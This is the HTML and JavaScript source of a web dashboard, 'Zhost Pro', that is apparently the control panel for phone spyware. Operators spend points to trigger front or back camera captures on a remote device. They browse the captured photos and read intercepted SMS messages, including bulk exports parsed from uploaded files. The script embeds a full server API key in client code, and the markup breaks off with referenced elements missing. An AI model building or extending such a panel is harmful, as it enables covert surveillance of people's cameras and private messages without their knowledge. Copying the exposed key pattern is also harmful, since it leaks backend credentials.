<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#0f172a">
<title>Zhost Pro</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  html,body{
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
    background:#0f172a;color:#e2e8f0;min-height:100vh;
  }
  body{padding:16px;display:flex;align-items:flex-start;justify-content:center}
  .container{max-width:900px;width:100%;margin:0 auto}

  /* ── Toast ── */
  #toastContainer{
    position:fixed;top:16px;left:50%;transform:translateX(-50%);
    z-index:9999;display:flex;flex-direction:column;gap:8px;
    width:calc(100% - 32px);max-width:500px;pointer-events:none;
  }
  .toast{
    padding:12px 16px;border-radius:10px;
    font-size:13px;font-weight:500;color:white;
    box-shadow:0 8px 24px rgba(0,0,0,.4);
    animation:slideDown .3s ease-out;
    line-height:1.4;pointer-events:auto;
    display:flex;align-items:center;gap:10px;
  }
  .toast.error{background:#dc2626;border-left:4px solid #fca5a5}
  .toast.success{background:#16a34a;border-left:4px solid #86efac}
  .toast.info{background:#2563eb;border-left:4px solid #93c5fd}
  .toast.warning{background:#d97706;border-left:4px solid #fcd34d}
  @keyframes slideDown{from{opacity:0;transform:translateY(-20px)}to{opacity:1;transform:translateY(0)}}
  @keyframes fadeOut{from{opacity:1}to{opacity:0;transform:translateY(-20px)}}
  .toast.hiding{animation:fadeOut .3s ease-in forwards}

  /* ── Login ── */
  #loginScreen{display:flex;align-items:center;justify-content:center;min-height:100vh;width:100%}
  .login-box{
    width:100%;max-width:400px;background:#1e293b;
    padding:32px;border-radius:16px;
    box-shadow:0 20px 60px rgba(0,0,0,0.5);
  }
  .login-box h2{
    color:#38bdf8;margin-bottom:24px;
    display:flex;align-items:center;justify-content:center;gap:10px;
    font-size:22px;
  }
  .login-box input{
    width:100%;padding:14px 16px;margin-bottom:16px;
    background:#0f172a;border:1px solid #334155;
    border-radius:8px;color:#e2e8f0;font-size:15px;
    font-family:inherit;outline:none;
  }
  .login-box input:focus{border-color:#38bdf8}
  .login-box input::placeholder{color:#64748b}
  .login-box button{
    width:100%;padding:14px;background:#38bdf8;color:#0f172a;
    border:none;border-radius:8px;font-size:16px;font-weight:700;
    cursor:pointer;margin-top:8px;
  }
  .login-box button:disabled{background:#475569;cursor:not-allowed}
  .error-msg{color:#f87171;font-size:14px;margin-top:12px;text-align:center;min-height:20px}

  /* ── Loading ── */
  #loadingScreen{display:flex;align-items:center;justify-content:center;min-height:100vh;width:100%}
  #loadingScreen svg{animation:spin 1s linear infinite}
  @keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}

  /* ── Dashboard ── */
  #dashScreen{width:100%}

  .header{
    display:flex;justify-content:space-between;align-items:center;
    margin-bottom:16px;padding:14px 18px;
    background:#1e293b;border-radius:12px;gap:8px;flex-wrap:wrap;
  }
  .header h1{
    font-size:18px;color:#38bdf8;flex:1;min-width:150px;
    display:flex;align-items:center;gap:8px;
  }
  .live-badge{
    display:inline-flex;align-items:center;gap:5px;
    padding:3px 8px;background:#065f46;color:#6ee7b7;
    border-radius:12px;font-size:10px;font-weight:700;
  }
  .live-dot{
    width:6px;height:6px;border-radius:50%;
    background:#10b981;animation:pulse 1.5s infinite;
  }
  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}

  .logout-btn{
    padding:8px 14px;background:#ef4444;color:white;
    border:none;border-radius:8px;cursor:pointer;font-size:13px;
    display:flex;align-items:center;gap:6px;font-weight:600;
  }

  .device-info{
    background:#1e293b;padding:14px 16px;border-radius:10px;
    margin-bottom:16px;font-size:13px;color:#94a3b8;line-height:1.8;
  }
  .device-info strong{color:#e2e8f0}

  /* ── Menu Button List ── */
  .btn-list{display:flex;flex-direction:column;gap:8px;margin-bottom:16px}
  .tab-btn{
    width:100%;padding:14px 18px;background:#1e293b;
    border:1px solid #334155;border-radius:10px;
    color:#e2e8f0;font-size:15px;font-weight:500;
    cursor:pointer;display:flex;align-items:center;
    justify-content:space-between;text-align:left;transition:all 0.2s;
    font-family:inherit;
  }
  .tab-btn .btn-left{display:flex;align-items:center;gap:12px}
  .tab-btn .tab-icon{
    width:22px;height:22px;
    display:flex;align-items:center;justify-content:center;
  }
  .tab-btn .tab-icon svg{width:20px;height:20px}
  .tab-btn .arrow{color:#64748b;font-size:20px;line-height:1}
  .tab-btn:hover{background:#293548;border-color:#38bdf8}
  .tab-btn.active{background:#38bdf8;color:#0f172a;border-color:#38bdf8}
  .tab-btn.active .arrow{color:#0f172a}

  .tab-content{display:none}
  .tab-content.active{display:block}

  /* ── Data Screen ── */
  #dataScreen{display:none}
  #dataScreen.show{display:block}

  .back-btn{
    display:inline-flex;align-items:center;gap:6px;
    padding:8px 14px;background:#1e293b;
    border:1px solid #334155;border-radius:8px;
    color:#94a3b8;font-size:13px;cursor:pointer;margin-bottom:14px;
    font-family:inherit;
  }
  .back-btn:hover{border-color:#38bdf8;color:#38bdf8}

  .page-title{
    font-size:18px;color:#38bdf8;margin-bottom:14px;font-weight:700;
    display:flex;align-items:center;gap:10px;
  }
  .page-title svg{width:22px;height:22px}

  .stats{
    display:grid;grid-template-columns:repeat(auto-fit,minmax(100px,1fr));
    gap:10px;margin-bottom:16px;
  }
  .stat-card{
    background:#1e293b;padding:14px 10px;border-radius:10px;text-align:center;
  }
  .stat-card .num{font-size:24px;font-weight:700;color:#38bdf8}
  .stat-card .lbl{font-size:11px;color:#94a3b8;margin-top:4px;text-transform:uppercase;letter-spacing:.5px}

  .info-bar{
    background:#1e293b;padding:10px 14px;border-radius:8px;
    margin-bottom:12px;font-size:12px;color:#38bdf8;text-align:center;
  }

  .placeholder{
    text-align:center;padding:50px 20px;color:#94a3b8;
    background:#1e293b;border-radius:10px;
  }
  .placeholder .icon{
    display:flex;align-items:center;justify-content:center;margin-bottom:16px;
  }
  .placeholder .icon svg{width:48px;height:48px}
  .placeholder h3{color:#e2e8f0;font-size:17px;margin-bottom:8px}
  .placeholder p{font-size:13px;line-height:1.6}

  /* ── Camera Cards ── */
  .cam-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:16px}
  .cam-card{
    background:#1e293b;border:1px solid #334155;
    border-radius:12px;padding:22px 12px;
    display:flex;flex-direction:column;align-items:center;gap:10px;
    cursor:pointer;transition:.15s;font-family:inherit;
    color:#e2e8f0;
  }
  .cam-card:active{transform:scale(.97);background:#293548}
  .cam-card-icon{
    width:52px;height:52px;border-radius:50%;
    background:linear-gradient(135deg,#38bdf8,#0ea5e9);
    display:flex;align-items:center;justify-content:center;
    box-shadow:0 6px 18px rgba(56,189,248,.28);
  }
  .cam-card-icon svg{width:26px;height:26px;fill:#0f172a}
  .cam-card-name{font-size:14px;font-weight:700;color:#e2e8f0}
  .cam-card-cost{font-size:11.5px;color:#64748b;font-weight:500}

  /* ── SMS List (Device Tracker style — ALL SHOWN) ── */
  .sms-list{display:flex;flex-direction:column;gap:10px}
  .sms-item{
    background:#1e293b;border-radius:10px;
    padding:12px 14px;
    border-left:3px solid #38bdf8;
  }
  .sms-item.out{border-left-color:#f59e0b}
  .sms-item.batch{border-left-color:#a855f7}
  .sms-item .top{
    display:flex;justify-content:space-between;
    font-size:11px;color:#94a3b8;margin-bottom:6px;gap:8px;
  }
  .sms-item .phone{
    color:#38bdf8;font-weight:600;font-size:13px;
    word-break:break-all;
  }
  .sms-item.out .phone{color:#f59e0b}
  .sms-item.batch .phone{color:#a855f7}
  .sms-item .msg{
    color:#e2e8f0;font-size:13px;line-height:1.5;
    word-wrap:break-word;white-space:pre-wrap;
  }
  .sms-item .dir-badge{
    display:inline-block;padding:2px 7px;border-radius:4px;
    font-size:10px;font-weight:700;margin-right:5px;
    text-transform:uppercase;letter-spacing:.4px;
  }
  .dir-in{background:#16a34a;color:white}
  .dir-out{background:#f59e0b;color:white}
  .dir-batch{background:#a855f7;color:white}

  /* ── Photo Grid ── */
  .photo-header{
    display:flex;justify-content:space-between;align-items:center;
    margin:20px 0 12px;
  }
  .photo-header h3{
    font-size:13px;color:#94a3b8;font-weight:700;
    text-transform:uppercase;letter-spacing:.5px;
  }
  .photo-count{
    font-size:12px;color:#64748b;background:#1e293b;
    padding:4px 10px;border-radius:12px;border:1px solid #334155;
    font-weight:600;
  }
  .photo-grid{
    display:grid;grid-template-columns:repeat(3,1fr);gap:6px;
  }
  @media(min-width:600px){.photo-grid{grid-template-columns:repeat(4,1fr)}}
  .photo-tile{
    position:relative;aspect-ratio:1/1;background:#1e293b;
    border-radius:8px;overflow:hidden;cursor:pointer;
    border:1px solid #334155;transition:.15s;
  }
  .photo-tile:hover{border-color:#38bdf8}
  .photo-tile img{width:100%;height:100%;object-fit:cover;display:block}
  .photo-tile .spinner{
    position:absolute;top:50%;left:50%;
    transform:translate(-50%,-50%);
    width:20px;height:20px;
    border:2.5px solid #334155;border-top-color:#38bdf8;
    border-radius:50%;animation:spin .8s linear infinite;
  }
  .photo-tile .pdate{
    position:absolute;bottom:0;left:0;right:0;
    background:linear-gradient(to top,rgba(0,0,0,.9),transparent);
    color:white;font-size:9px;padding:14px 6px 4px;
    text-align:center;white-space:nowrap;
    overflow:hidden;text-overflow:ellipsis;
  }

  /* ── Profile ── */
  .profile-hero{
    background:linear-gradient(135deg,#38bdf8,#0ea5e9);
    border-radius:14px;padding:24px;color:#0f172a;
    margin-bottom:18px;box-shadow:0 12px 28px rgba(56,189,248,.28);
    position:relative;overflow:hidden;
  }
  .profile-hero::after{
    content:"";position:absolute;top:-40px;right:-40px;
    width:140px;height:140px;border-radius:50%;
    background:rgba(15,23,42,.08);
  }
  .profile-avatar{
    width:56px;height:56px;border-radius:50%;
    background:rgba(15,23,42,.2);
    display:flex;align-items:center;justify-content:center;
    font-size:22px;font-weight:800;
    margin-bottom:14px;position:relative;z-index:1;
  }
  .profile-name{
    font-size:19px;font-weight:800;margin-bottom:3px;
    position:relative;z-index:1;
  }
  .profile-email{
    font-size:12.5px;opacity:.75;word-break:break-all;
    position:relative;z-index:1;
  }
  .profile-points{
    display:inline-flex;align-items:center;gap:8px;
    background:rgba(15,23,42,.2);
    padding:8px 15px;border-radius:20px;
    font-size:14px;font-weight:700;
    margin-top:16px;position:relative;z-index:1;
  }
  .profile-points svg{width:15px;height:15px;fill:#FFD700}

  .menu-group{
    background:#1e293b;border:1px solid #334155;
    border-radius:12px;overflow:hidden;margin-bottom:16px;
  }
  .menu-row{
    display:flex;align-items:center;justify-content:space-between;
    padding:14px 16px;border-bottom:1px solid #334155;
    font-size:13.5px;
  }
  .menu-row:last-child{border-bottom:none}
  .menu-label{color:#94a3b8;font-weight:500}
  .menu-value{
    color:#e2e8f0;font-weight:600;font-size:13px;
    max-width:60%;overflow:hidden;text-overflow:ellipsis;
    white-space:nowrap;text-align:right;
  }

  /* ── Lightbox ── */
  .lightbox{
    display:none;position:fixed;inset:0;
    background:rgba(0,0,0,.96);
    z-index:10000;align-items:center;justify-content:center;padding:20px;
  }
  .lightbox.show{display:flex}
  .lightbox img{max-width:100%;max-height:90vh;border-radius:8px}
  .lightbox-close{
    position:absolute;top:18px;right:18px;
    width:42px;height:42px;border-radius:50%;
    background:#ef4444;color:white;
    display:flex;align-items:center;justify-content:center;
    font-size:22px;font-weight:700;cursor:pointer;border:none;
  }

  /* ── Overlay ── */
  .overlay{
    display:none;position:fixed;inset:0;
    background:rgba(15,23,42,.92);
    backdrop-filter:blur(4px);
    z-index:9999;
    align-items:center;justify-content:center;
    flex-direction:column;gap:14px;
  }
  .overlay.show{display:flex}
  .overlay-spinner{
    width:38px;height:38px;
    border:3px solid #334155;border-top-color:#38bdf8;
    border-radius:50%;animation:spin2 .8s linear infinite;
  }
  @keyframes spin2{to{transform:rotate(360deg)}}
  .overlay-text{color:#38bdf8;font-size:13px;font-weight:700}

  .hidden{display:none !important}

  svg{display:block}
</style>
</head>
<body>

<div id="toastContainer"></div>

<div class="container">

  <!-- ═══════════ LOGIN ═══════════ -->
  <div id="loginScreen">
    <div class="login-box">
      <h2>
        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
        </svg>
        Zhost Pro
      </h2>
      <input id="emailInput" type="email" placeholder="Email" autocomplete="email">
      <input id="passwordInput" type="password" placeholder="Password" autocomplete="current-password">
      <button id="loginBtn">Login</button>
      <div class="error-msg" id="loginError"></div>
    </div>
  </div>

  <!-- ═══════════ LOADING ═══════════ -->
  <div id="loadingScreen" class="hidden">
    <div style="text-align:center;color:#94a3b8">
      <svg width="42" height="42" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M21 12a9 9 0 1 1-6.219-8.56"/>
      </svg>
      <div style="margin-top:12px;font-size:13px">Loading...</div>
    </div>
  </div>

  <!-- ═══════════ DASHBOARD ═══════════ -->
  <div id="dashScreen" class="hidden">

    <div class="header">
      <h1>
        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <rect x="3" y="3" width="7" height="9" rx="1"/>
          <rect x="14" y="3" width="7" height="5" rx="1"/>
          <rect x="14" y="12" width="7" height="9" rx="1"/>
          <rect x="3" y="16" width="7" height="5" rx="1"/>
        </svg>
        Zhost Pro
        <span class="live-badge"><span class="live-dot"></span>LIVE</span>
      </h1>
      <button class="logout-btn" id="logoutBtn">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/>
          <polyline points="16 17 21 12 16 7"/>
          <line x1="21" y1="12" x2="9" y2="12"/>
        </svg>
        Logout
      </button>
    </div>

    <div class="device-info" id="deviceInfo">
      <strong>User:</strong> <span id="userEmail">-</span>
    </div>

    <!-- ═══ MENU ═══ -->
    <div id="menuScreen">
      <div class="btn-list">

        <button class="tab-btn" data-tab="camera">
          <span class="btn-left">
            <span class="tab-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
                <circle cx="12" cy="13" r="4"/>
              </svg>
            </span>
            <span>Camera</span>
          </span>
          <span class="btn-right"><span class="arrow">›</span></span>
        </button>

        <button class="tab-btn" data-tab="sms">
          <span class="btn-left">
            <span class="tab-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
                <polyline points="22,6 12,13 2,6"/>
              </svg>
            </span>
            <span>SMS</span>
          </span>
          <span class="btn-right"><span class="arrow">›</span></span>
        </button>

        <button class="tab-btn" data-tab="profile">
          <span class="btn-left">
            <span class="tab-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="#a855f7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                <circle cx="12" cy="7" r="4"/>
              </svg>
            </span>
            <span>Profile</span>
          </span>
          <span class="btn-right"><span class="arrow">›</span></span>
        </button>

      </div>
    </div>

    <!-- ═══ DATA SCREEN ═══ -->
    <div id="dataScreen">
      <button class="back-btn" id="backBtn">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <line x1="19" y1="12" x2="5" y2="12"/>
          <polyline points="12 19 5 12 12 5"/>
        </svg>
        Back
      </button>

      <!-- ═══ CAMERA TAB ═══ -->
      <div id="tab-camera" class="tab-content">
        <div class="page-title">
          <svg viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
            <circle cx="12" cy="13" r="4"/>
          </svg>
          Camera
        </div>

        <div class="cam-grid">
          <button class="cam-card" data-cam="front">
            <div class="cam-card-icon">
              <svg viewBox="0 0 24 24"><path d="M20 5h-3.17L15 3H9L7.17 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-8 13c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
            </div>
            <div class="cam-card-name">Front</div>
            <div class="cam-card-cost">-1 point</div>
          </button>
          <button class="cam-card" data-cam="back">
            <div class="cam-card-icon">
              <svg viewBox="0 0 24 24"><path d="M20 5h-3.17L15 3H9L7.17 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-8 13c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
            </div>
            <div class="cam-card-name">Back</div>
            <div class="cam-card-cost">-1 point</div>
          </button>
        </div>

        <div class="stats">
          <div class="stat-card"><div class="num" id="camPoints">0</div><div class="lbl">Points</div></div>
          <div class="stat-card"><div class="num" id="photoTotal">0</div><div class="lbl">Photos</div></div>
        </div>

        <div class="info-bar" id="camStatus">Ready</div>

        <div class="photo-header">
          <h3>Captured Photos</h3>
          <span class="photo-count" id="photoCount">0</span>
        </div>

        <div id="photoGrid" class="photo-grid"></div>
        <div id="photosEmpty" class="placeholder hidden" style="margin-top:12px">
          <div class="icon">
            <svg viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
              <rect x="3" y="3" width="18" height="18" rx="2" ry="2"/>
              <circle cx="8.5" cy="8.5" r="1.5"/>
              <polyline points="21 15 16 10 5 21"/>
            </svg>
          </div>
          <h3>No photos yet</h3>

<script>
/* ═══ CONFIG ═══ */
const API = "https://fra.cloud.appwrite.io/v1";
const PROJECT = "6ac22101001089112d96";
const DB = "6ac221fb00166d13f9de";
const T_USERS = "users";
const T_PHOTOS = "photos";
const T_COMMANDS = "commands";
const T_SMS = "sms";
const BUCKET = "photos";
const CAMERA_COST = 1;

const API_KEY = "standard_36c054f57ff04721e832a77cdd0702a731e2c5cecb28603281b456dacc2bf730ab3967ec377cc8647843233f5d1e3bb6b98a5f30869c2aa12cf244b56e978651cae2efbc4b0f231a6c3eff78403b93ceda7d534e68e7b9bd4835c019e71b40cea5e840aa9c4a698cce4b3e039b94defff42ba04244e57a507bfa8fc97fe4fe27";

let state = { userRow: null, photos: [], sms: [] };
const $ = (id) => document.getElementById(id);

/* ═══ HELPERS ═══ */
function toast(msg, type = "info") {
  const c = $("toastContainer");
  const el = document.createElement("div");
  el.className = "toast " + type;
  el.textContent = msg;
  c.appendChild(el);
  setTimeout(() => {
    el.classList.add("hiding");
    setTimeout(() => el.remove(), 300);
  }, 3000);
}
function showOverlay(text = "Loading...") {
  $("overlayText").textContent = text;
  $("overlay").classList.add("show");
}
function hideOverlay() { $("overlay").classList.remove("show"); }
function showLoginError(msg) { $("loginError").textContent = msg; }
function hideLoginError() { $("loginError").textContent = ""; }
function escapeHtml(s) {
  return String(s || "").replace(/[&<>"']/g, c => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
  })[c]);
}
function fmtTime(t) {
  try {
    const d = new Date(t);
    if (isNaN(d.getTime())) return t;
    return d.toLocaleString([], {
      month: "short", day: "numeric",
      hour: "2-digit", minute: "2-digit"
    });
  } catch (e) { return t; }
}
function getInitial(name) {
  const n = String(name || "?").trim();
  if (!n) return "?";
  const m = n.match(/[A-Za-z0-9]/);
  return (m ? m[0] : n[0]).toUpperCase();
}

/* ═══ API ═══ */
async function api(method, path, body) {
  const opts = {
    method,
    headers: {
      "X-Appwrite-Project": PROJECT,
      "X-Appwrite-Key": API_KEY,
      "Content-Type": "application/json",
    },
  };
  if (body) opts.body = JSON.stringify(body);
  const res = await fetch(API + path, opts);
  const text = await res.text();
  let data;
  try { data = text ? JSON.parse(text) : null; } catch (e) { data = text; }
  if (!res.ok) {
    const msg = (data && data.message) ? data.message : `HTTP ${res.status}`;
    throw new Error(msg);
  }
  return data;
}

/* ═══ LOGIN ═══ */
async function doLogin(email, password) {
  try {
    await fetch(API + "/account/sessions/current", {
      method: "DELETE",
      headers: { "X-Appwrite-Project": PROJECT },
    });
  } catch (e) {}

  const res = await fetch(API + "/account/sessions/email", {
    method: "POST",
    headers: {
      "X-Appwrite-Project": PROJECT,
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ email, password }),
  });
  const text = await res.text();
  let data;
  try { data = text ? JSON.parse(text) : null; } catch (e) { data = null; }
  if (!res.ok) {
    const msg = (data && data.message) ? data.message : "Invalid email or password";
    throw new Error(msg);
  }
  return data;
}

async function findUserRow(userId, email) {
  const q = encodeURIComponent(JSON.stringify({
    method: "equal", attribute: "userId", values: [userId]
  }));
  try {
    const res = await api("GET", `/tablesdb/${DB}/tables/${T_USERS}/rows?queries[]=${q}`);
    if (res && res.rows && res.rows.length > 0) return res.rows[0];
  } catch (e) {}
  const q2 = encodeURIComponent(JSON.stringify({
    method: "equal", attribute: "email", values: [email]
  }));
  try {
    const res2 = await api("GET", `/tablesdb/${DB}/tables/${T_USERS}/rows?queries[]=${q2}`);
    if (res2 && res2.rows && res2.rows.length > 0) return res2.rows[0];
  } catch (e) {}
  return null;
}

/* ═══ PHOTOS ═══ */
async function loadPhotos() {
  if (!state.userRow) return;
  const userId = state.userRow.userId;
  const q = encodeURIComponent(JSON.stringify({method:"equal",attribute:"capturedByUserId",values:[userId]}));
  const q2 = encodeURIComponent(JSON.stringify({method:"orderDesc",attribute:"$createdAt"}));
  const q3 = encodeURIComponent(JSON.stringify({method:"limit",values:[60]}));
  try {
    const res = await api("GET",
      `/tablesdb/${DB}/tables/${T_PHOTOS}/rows?queries[]=${q}&queries[]=${q2}&queries[]=${q3}`);
    const photos = (res && res.rows ? res.rows : []).filter(p => p.fileId && !p.isDeleted);
    state.photos = photos;
    renderPhotos(photos);
  } catch (e) {
    console.warn("Photos:", e.message);
    renderPhotos([]);
  }
}

async function fetchPhotoBlobUrl(fileId) {
  const url = `${API}/storage/buckets/${BUCKET}/files/${fileId}/view?project=${PROJECT}`;
  const res = await fetch(url, {
    headers: { "X-Appwrite-Key": API_KEY, "X-Appwrite-Project": PROJECT },
  });
  if (!res.ok) throw new Error("HTTP " + res.status);
  const blob = await res.blob();
  return URL.createObjectURL(blob);
}

async function renderPhotos(photos) {
  const grid = $("photoGrid");
  const empty = $("photosEmpty");
  const count = $("photoCount");
  const total = $("photoTotal");
  grid.innerHTML = "";
  if (count) count.textContent = photos.length;
  if (total) total.textContent = photos.length;

  if (!photos.length) { empty.classList.remove("hidden"); return; }
  empty.classList.add("hidden");

  for (const p of photos) {
    const div = document.createElement("div");
    div.className = "photo-tile";
    const sp = document.createElement("div");
    sp.className = "spinner";
    div.appendChild(sp);
    grid.appendChild(div);

    try {
      const blobUrl = await fetchPhotoBlobUrl(p.fileId);
      const img = document.createElement("img");
      img.src = blobUrl;
      img.onload = () => sp.remove();
      div.insertBefore(img, sp);
      div.onclick = () => openLightbox(blobUrl);
      const pd = document.createElement("div");
      pd.className = "pdate";
      pd.textContent = fmtTime(p.$createdAt);
      div.appendChild(pd);
    } catch (e) {
      sp.remove();
      div.innerHTML = '<div style="color:#ef4444;font-size:10px;text-align:center;padding:20px 4px">✕</div>';
    }
  }
}

function openLightbox(src) {
  $("lightboxImg").src = src;
  $("lightbox").classList.add("show");
}
$("lightboxClose").onclick = () => {
  $("lightbox").classList.remove("show");
  $("lightboxImg").src = "";
};
$("lightbox").onclick = (e) => {
  if (e.target.id === "lightbox") {
    $("lightbox").classList.remove("show");
    $("lightboxImg").src = "";
  }
};

/* ═══════════════════════════════════════════════════════
   SMS — Parse batch file content, show ALL messages
   ═══════════════════════════════════════════════════════ */

/**
 * Parse batch txt file content
 * Format example:
 * ═══════════════════════════════════════
 *   SMS INITIAL EXPORT
 * ═══════════════════════════════════════
 * Total    : 100 messages
 * Generated: ...
 * ═══════════════════════════════════════
 *
 * ────── SMS #1 ──────
 * FROM : MYTEL
 * NUM  : 12345
 * TIME : 2025-10-07 10:30:00
 *
 * Body message here...
 *
 * ────── SMS #2 ──────
 * ...
 */
function parseBatchTxt(text) {
  const results = [];
  // Split by SMS markers "────── SMS #N ──────"
  const blocks = text.split(/─+\s*SMS\s*#\d+\s*─+/);

  for (let i = 1; i < blocks.length; i++) {
    const block = blocks[i];
    // Extract fields
    const fromMatch = block.match(/FROM\s*:\s*([^\n]+)/);
    const numMatch = block.match(/NUM\s*:\s*([^\n]+)/);
    const timeMatch = block.match(/TIME\s*:\s*([^\n]+)/);
    const typeMatch = block.match(/TYPE\s*:\s*([^\n]+)/);

    const from = fromMatch ? fromMatch[1].trim() : "Unknown";
    const num = numMatch ? numMatch[1].trim() : "";
    const time = timeMatch ? timeMatch[1].trim() : "";
    const type = typeMatch ? typeMatch[1].trim() : "inbox";

    // Body: everything after TIME line (or after the last field)
    let body = "";
    if (timeMatch) {
      body = block.substring(timeMatch.index + timeMatch[0].length);
    } else if (fromMatch) {
      body = block.substring(fromMatch.index + fromMatch[0].length);
    } else {
      body = block;
    }
    // Trim whitespace and remove trailing/leading dashes
    body = body.replace(/^\s*\n/, "").replace(/\n\s*$/, "").trim();

    results.push({
      from: from,
      num: num,
      time: time,
      type: type,
      body: body
    });
  }

  return results;
}

/**
 * Parse single SMS (kind=single) — just one message
 */
function parseSingleSms(row) {
  const senderName = row.senderName || row.sender || "Unknown";
  const time = row.receivedAt ? fmtTime(row.receivedAt) : "";
  const type = (row.type || "inbox").toLowerCase();
  return [{
    from: senderName,
    num: row.sender || "",
    time: time,
    type: type,
    body: row.body || ""
  }];
}

async function loadSms() {
  if (!state.userRow) return;
  const userId = state.userRow.userId;
  const q = encodeURIComponent(JSON.stringify({method:"equal",attribute:"ownerUserId",values:[userId]}));
  const q2 = encodeURIComponent(JSON.stringify({method:"orderDesc",attribute:"receivedAt"}));
  const q3 = encodeURIComponent(JSON.stringify({method:"limit",values:[50]}));
  try {
    const res = await api("GET",
      `/tablesdb/${DB}/tables/${T_SMS}/rows?queries[]=${q}&queries[]=${q2}&queries[]=${q3}`);
    const rows = (res && res.rows ? res.rows : []).filter(r => !r.isDeleted);
    state.sms = rows;
    await renderSms(rows);
  } catch (e) {
    console.warn("SMS:", e.message);
    renderSmsEmpty();
  }
}

async function renderSms(rows) {
  const el = $("smsList");
  const empty = $("smsEmpty");
  const status = $("smsStatus");

  el.innerHTML = "";

  if (!rows.length) {
    empty.classList.remove("hidden");
    $("smsTotal").textContent = "0";
    $("smsIn").textContent = "0";
    $("smsOut").textContent = "0";
    if (status) status.style.display = "none";
    return;
  }
  empty.classList.add("hidden");

  // Parse ALL messages
  let allMessages = [];
  let batchCount = 0;
  let singleCount = 0;

  for (const row of rows) {
    const kind = (row.kind || "single").toLowerCase();
    const isBatch = kind === "batch" || kind === "initial" || kind === "offline";

    if (isBatch && row.fileId) {
      batchCount++;
      // Fetch and parse batch file
      try {
        const url = `${API}/storage/buckets/${BUCKET}/files/${row.fileId}/view?project=${PROJECT}`;
        const res = await fetch(url, {
          headers: { "X-Appwrite-Key": API_KEY, "X-Appwrite-Project": PROJECT },
        });
        if (res.ok) {
          const text = await res.text();
          const parsed = parseBatchTxt(text);
          allMessages = allMessages.concat(parsed);
        }
      } catch (e) {
        console.warn("Batch fetch error:", e);
      }
    } else {
      singleCount++;
      const parsed = parseSingleSms(row);
      allMessages = allMessages.concat(parsed);
    }
  }

  // Stats
  let inC = 0, outC = 0;
  allMessages.forEach(m => {
    const t = (m.type || "inbox").toLowerCase();
    if (t === "sent" || t === "outbox" || t === "out") outC++;
    else inC++;
  });
  $("smsTotal").textContent = allMessages.length;
  $("smsIn").textContent = inC;
  $("smsOut").textContent = outC;

  if (status) {
    if (allMessages.length > 0) {
      status.style.display = "block";
      status.textContent = `${allMessages.length} messages from ${rows.length} batch/single entries`;
    } else {
      status.style.display = "none";
    }
  }

  // Render ALL messages directly
  if (!allMessages.length) {
    empty.classList.remove("hidden");
    return;
  }

  // Build HTML in one go
  let html = "";
  allMessages.forEach(m => {
    const t = (m.type || "inbox").toLowerCase();
    const isOut = t === "sent" || t === "outbox" || t === "out";
    const cls = isOut ? "out" : "in";
    const badgeCls = isOut ? "dir-out" : "dir-in";
    const badgeText = isOut ? "OUT" : "IN";

    html += `<div class="sms-item ${cls}">
      <div class="top">
        <span class="phone">${escapeHtml(m.from)}${m.num && m.num !== m.from ? ' · ' + escapeHtml(m.num) : ''}</span>
        <span>${escapeHtml(m.time)}</span>
      </div>
      <div class="msg"><span class="dir-badge ${badgeCls}">${badgeText}</span>${escapeHtml(m.body)}</div>
    </div>`;
  });

  el.innerHTML = html;
}

function renderSmsEmpty() {
  $("smsTotal").textContent = "0";
  $("smsIn").textContent = "0";
  $("smsOut").textContent = "0";
  $("smsList").innerHTML = "";
